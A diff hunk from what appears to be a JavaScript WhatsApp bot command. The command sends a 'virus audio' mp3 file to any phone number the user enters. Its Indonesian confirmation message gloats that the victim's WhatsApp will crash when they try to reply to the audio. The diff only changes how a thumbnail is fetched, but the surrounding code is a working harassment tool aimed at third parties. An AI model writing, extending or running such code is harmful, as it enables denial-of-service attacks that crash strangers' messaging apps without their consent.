@@ -16,7 +16,7 @@ let name = conn.getName(who)
 let virusaudio = fs.readFileSync('./mp3/a-virusaudio-v1.mp3')
 conn.reply(m.chat, 'Sedang Mengirim...', m)
 conn.reply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', virusaudio,)
-await conn.send2ButtonImg(m.chat, wanz, gcname, `*Sukses Mengirim ${command} Ke Nomor: ${text}@s.whatsapp.net\n\n*NOTE*:Virus Ini Aktif Ketika Korban Mau Balas Audio,Maka Wangsafnya Akan Crash.\nhehe🗿\n\n${botdate}`,
+await conn.send2ButtonImg(m.chat, await (await fetch(thumb)).buffer(), gcname, `*Sukses Mengirim ${command} Ke Nomor: ${text}@s.whatsapp.net\n\n*NOTE*:Virus Ini Aktif Ketika Korban Mau Balas Audio,Maka Wangsafnya Akan Crash.\nhehe🗿\n\n${botdate}`,
    'Menu','.menu',
      'Owner','.owner'
        )
